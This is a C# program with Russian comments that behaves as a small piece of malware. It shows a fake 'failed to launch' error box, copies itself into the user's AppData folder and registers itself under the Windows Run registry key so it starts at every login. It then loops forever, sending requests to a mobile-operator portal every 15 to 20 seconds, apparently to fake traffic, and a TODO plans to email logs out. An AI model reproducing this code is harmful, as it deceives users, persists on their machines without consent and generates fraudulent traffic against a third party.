using System;
using System.Windows;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        const String appName = "Reward";
        String appDirectory = $@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\{appName}";
        const String fileName = appName + ".exe";
        String filePath = $@"{appDirectory}\{fileName}";
        RegistryKey autorun = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
        String regValue = autorun.GetValue(appName) as String;
        // Если ключ не найден или параметром ключа не является строка или строка является правильным путем к приложению
        if (regValue == null || regValue != filePath)
        {
            // Прописываемся в реестре и запускаем себя из правильного пути
            MessageBox.Show("Не удалось запустить приложение!", "Ошибка");
            if (!File.Exists(filePath))
            {
                String[] args = Environment.GetCommandLineArgs();
                if (!Directory.Exists(appDirectory))
                {
                    Directory.CreateDirectory(appDirectory);
                }
                File.Copy(args.Length > 0 ? args[0] : $@"{Environment.CurrentDirectory}\{fileName}", filePath);
            }
            autorun.SetValue(appName, filePath);
            Process.Start(filePath);
            return;
        }
        RandomBrowser browser = new RandomBrowser(@"http://www.pda.primorye.mts.ru");
        Random randomizer = new Random();
        while (true)
        {
            Thread.Sleep(TimeSpan.FromSeconds(15 + randomizer.Next(5)));
            browser.Request();
            // TODO: Add iteration counter and sending logs to E-Mail
        }
    }
}
